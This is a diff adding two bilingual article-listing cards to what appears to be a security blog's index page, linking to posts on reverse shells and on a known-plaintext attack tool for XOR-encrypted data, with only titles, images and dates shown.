+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
